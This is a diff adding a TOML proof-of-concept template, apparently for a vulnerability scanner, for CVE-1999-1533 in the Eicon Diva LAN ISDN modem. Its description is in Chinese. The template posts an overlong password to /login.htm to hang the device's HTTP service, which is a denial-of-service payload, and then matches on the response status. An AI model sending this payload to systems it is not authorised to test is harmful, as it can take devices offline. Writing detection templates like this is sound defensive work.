@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "Eicon Diva LAN ISDN 调制解调器 HTTP 服务的 login.htm 对 password 参数缺乏长度校验，远程攻击者提交超长密码可令设备 HTTP 服务挂起（DoS）。本 PoC 通过向 login.htm 发送含超长 password 参数的请求，验证目标是否在处理长输入时异常。验证方式为发送请求后观察目标是否停止响应，属安全无损探测。"
+id = "POC-AVE-1999-1166"
+name = "CVE-1999-1533 Eicon Diva LAN ISDN Modem 登录页长密码拒绝服务 PoC"
+severity = "high"
+tags = ["ave-1999-1166"]
+vuln_id = [
+    "CVE-1999-1533",
+    "AVE-1999-1166",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/login.htm"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=test&password=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
